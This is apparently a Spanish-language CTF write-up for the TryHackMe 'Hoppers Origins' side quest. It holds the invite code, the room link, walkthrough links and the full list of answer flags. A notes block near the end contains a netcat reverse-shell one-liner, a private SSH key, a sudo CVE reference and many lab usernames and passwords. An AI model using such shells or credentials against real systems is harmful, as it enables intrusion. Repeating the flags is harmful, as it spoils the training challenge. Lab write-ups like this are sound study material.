
#   Side Quest 0 : Hopper's Origin
Hopper's Origin
> **Room URL:** [ho-aoc2025-yboMoPbnEX](https://tryhackme.com/jr/ho-aoc2025-yboMoPbnEX)

> **Event:** Advent of Cyber 2025 Side Quest
---

## 📝 Descripción
# Hoppers Origins
From HopSec Island, Eggsploits whisper through TBFC - Origins of how SOC-mas became EAST-mas.



##Hoppers Origins room info
Room Type  Free Room. Anyone can deploy virtual machines in the room (without being subscribed)!

Created by:   am03bam4n
Created 53 days ago



# Task 2

Flag Submissions
Submit your flags below. Note that the flags are in alphabetical order and not the order of compromise.

On Linux machines, you can find flags here:

user.txt - In /user.txt
root.txt - In /root/root.txt
On Windows machines, you can find flags here:

user.txt - In C:\user.txt
root.txt - In C:\Users\Administrator\root.txt
"Carrot coins later - EAST-mas first. Hop in!" - King Malhare

Answer the questions below
DB: user.txt

Answer format: `***{************************************}`

 
AI.VANCHAT.LOC: user.txt

Answer format: `***{************************************}`

 
AI.VANCHAT.LOC: root.txt

Answer format: `***{************************************}`

 
TBFC.LOC: user.txt

Answer format: `***{************************************}`

 
TBFC.LOC: root.txt

Answer format: `***{************************************}`

 
VANCHAT.LOC: user.txt

Answer format: `***{************************************}`

 
VANCHAT.LOC: root.txt

Answer format: `***{************************************}`

 
SERVER1: user.txt

Answer format: `***{************************************}`

 
SERVER1: root.txt

Answer format: `***{************************************}`

 
SERVER2: user.txt

Answer format: `***{************************************}`

 
SERVER2: root.txt

Answer format: `***{************************************}`

 
SERVER3: user.txt

Answer format: `***{************************************}`

 
SERVER3: root.txt

Answer format: `***{************************************}`

 
SERVER4: user.txt

Answer format: `***{************************************}`

 
SERVER4: root.txt

Answer format: `***{************************************}`
 
Web: user.txt

Answer format: `***{************************************}`

 
Web: root.txt

Answer format: `***{************************************}`

01.01.2026
 
 
---
  #solution

Se debe ingresar la clave para su acceso.

**Access URL: Hopper's Invitation**
`https://static-labs.tryhackme.cloud/apps/hoppers-invitation/`

Como bien sabemos desde el link de sidequest 1, una vez decodificado el contenido con la flag (paso final),
 se procede a decodificar el contenido del `.txt` indicado en su código de fuente. Analizando el código de fuente, el acceso lo permite.

**URL:** `https://static-labs.tryhackme.cloud/apps/hoppers-invitation/`
**Invite Code:** `THM{There.is.no.EASTmas.without.Hopper}`


---

# Hopper's Origin

**Access URL: Hopper's Invitation**
`https://static-labs.tryhackme.cloud/apps/hoppers-invitation/`

Al ingresar la llave del final de Sidequest 1, se observa un error de CORS, pero se revela el archivo adicional:
`https://assets.tryhackme.com/additional/aoc2025/files/hopper-origins.txt`

**Content:**
`hlRAqw3zFxnrgUw1GZusk+whhQHE0F+g7YjWjoJvpZRSCoDzehjXsEX1wQ6TTlOPyEJ/k+AEiMOxdqywh/86AOmhTaXNyZAvbHUVjfMdTqdzxmLXZJwI5ynI`

### Ejecución del POC (Prueba de Concepto)  

```python
[*] Intentando hackear el acceso...
[*] Datos extraídos:
    - Salt: 865440ab0df31719eb814c35199bac93
    - IV:   ec218501c4d05fa0ed88d68e
    - Tag:  826fa594520a80f37a18d7b045f5c10e
    - Longitud Ciphertext: 46 bytes
[*] Derivando clave con PBKDF2...
--------------------------------------------------
RESULTADO:
https://tryhackme.com/jr/ho-aoc2025-yboMoPbnEX
--------------------------------------------------

```

**Room Link:** [https://tryhackme.com/room/ho-aoc2025-yboMoPbnEX](https://tryhackme.com/room/ho-aoc2025-yboMoPbnEX)

---

# #solution to start:

`https://tryhackme.com/jr/ho-aoc2025-yboMoPbnEX`

---

# next steps:

### # TUT Hoppers Origins 01.01.2026

* [0xb0b Gitbook - Hoppers Origins](https://0xb0b.gitbook.io/writeups/tryhackme/2025/advent-of-cyber-25-side-quest/hoppers-origins)
* [GitHub Invitation Code (Djalil Ayed)](https://github.com/djalilayed/tryhackme/tree/main/Advent_of_Cyber_Side_Quest_2025/Side_Quest_Keys/invitation_code)
* [drouxinol github - Hoppers Origins](https://drouxinol.github.io/posts/tryhackme-aoc-2025-sq0/)
* [id-root github - Hoppers Origins] https://github.com/id-root/Hoppers-Origin-Writeup

---

# video

### YouTube Video Walk Through:

* **Invitation Guide:** [Watch Video](https://www.youtube.com/watch?v=guQ3MQmkUTg)
* **Hoppers Origins - Part 1 Walkthrough:** [Watch Video](https://www.youtube.com/watch?v=r1cUBw-G2kc) (DB // AI.VANCHAT.LOC )
* **Hoppers Origins - Part 2 Walkthrough:** [Watch Video](https://www.youtube.com/watch?v=T-Hfx8VC7Nk)




Answers Flag  
DB: user.txt

Answer format: `THM{114136cc-e9ab-4303-a825-18cb24d60d90}`

 
AI.VANCHAT.LOC: user.txt

Answer format: `THM{1dac8c6b-908e-4100-9deb-f53e68df840d}`

 
AI.VANCHAT.LOC: root.txt

Answer format: `THM{c4baffdf-7a8d-44e0-8405-3cb6a2bb91cc}`

 
TBFC.LOC: user.txt

Answer format: `THM{f3336b39-5601-40ea-a4d9-8b87cb4535a6}`

 
TBFC.LOC: root.txt

Answer format: `THM{449d70b5-a212-45ca-a49b-037678f49569}`

 
VANCHAT.LOC: user.txt

Answer format: `THM{e36efac9-555b-424a-b44d-8bfd9bc5f660}`

 
VANCHAT.LOC: root.txt

Answer format: `THM{cf66a7ad-6b5f-4e48-be3a-a39881f537c1}`

 
SERVER1: user.txt

Answer format: `THM{20f7d7ac-5768-4883-a33f-09e4a738bff1}`

 
SERVER1: root.txt

Answer format: `THM{d93ffd47-5629-4590-8eb3-743404547e04}`

 
SERVER2: user.txt

Answer format: `THM{d626aea9-d1ab-4f77-b668-90f221e3dbb6}`

 
SERVER2: root.txt

Answer format: `THM{496fde67-1d0d-4776-833d-b6371f290eac}`

 
SERVER3: user.txt

Answer format: `THM{a89e2667-f920-4c10-99ec-3ed33a7cf1b9}`

 
SERVER3: root.txt

Answer format: `THM{4fc264ab-8449-4039-a22d-25ee7d15626e}`

 
SERVER4: user.txt

Answer format: `THM{b792725b-604a-416d-9cbb-fe70d4def322}`

 
SERVER4: root.txt

Answer format: `THM{c58b7654-321a-4872-9645-d28097dcc9da}`
 
Web: user.txt

Answer format: `THM{82f9d06e-9a52-44d5-98c2-aef647805216}`

 
Web: root.txt

Answer format: `THM{583d5e19-4e61-47f1-b98e-5ece3b2d41db}`


others info  
 ```

SOC_ADMIN_EXECUTE_COMMAND: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP 4444 >/tmp/f
 

 id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAELOYujt
/vluUdyS/U7ZndAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIGT9FlPyzrv+aUra
DIDA8Q5nTOhHZ0IpHfpbQDIs/ph/AAAAoDMzy/jLhDwOxhUUP+1NiVFSG7XAdtc8fNeTPI
XN6WKNqQD94nB1iOqzmN7g55slKuxmANcieQGkKYUibOiI16Hp+pOakUq16Vuj0PFZdKLe
gMNn4lfTDF6EsNQOMP1oF7L8MJcpySn1qCWm1ocso0CHDgsD3Xj0dOTXaTYxehnupB0vJR
FLHQ6nBC63Zb8VP9GxtfiSewAd+OkRPe8B/3c=
-----END OPENSSH PRIVATE KEY-----

ssh -v -i  id_rsa socbot3000@IP 
password    (for soc bot) 
 CVE for sudo  CVE-2025-32463

 anne.clark@ai.vanchat.loc  Wbqs8193

 qw2.amy.young@AI.VANCHAT.LOC password1!
 AI\qw1.brian.singh:_4v41yVd$!DW
 qw1.lucy.fry Password123!
 qw1.martyn.jones Password123!
 password in keepass adm_8XX8N5VBFprFfmFSdQ4soUM4
  
 rdp server 3 to 4 
 TBFC-SQLServer1\AGI P@ssword123!
 
``` 

end 



``` 
Hopper couldn't shake the memory of how he, only he, made the King's dream a reality. And after all of that, how did the King repay him? Humiliation. Incarceration. Hopper had always been overjoyed to lead the Red Team Battalion ù too overjoyed, some thought. Multiple anonymous sources reported Hopper for showing "delusions of grandeur" and early signs of going "mad with power."Surely the King would defend him? After everything Hopper had done?What the King did was the furthest thing from that. King Malhare stripped Hopper of his title and "crowned" him the new Court Jester. With no choice but to obey, Hopper was forced to entertain the royal court day after day, month after monthà until one day he failed to contain his anger and snapped back at the King.He was immediately sent to the HopSec Asylum, where he now sits.But as rumours spread that King Malhare finally intends to launch Operation EAST-mas, Hopper's rage ignites anew.He must find a way out.The story continues in this year's Advent of Cyber & SideQuest event!
```



---

*Documentación para propósitos educativos y registro de CTF.*
 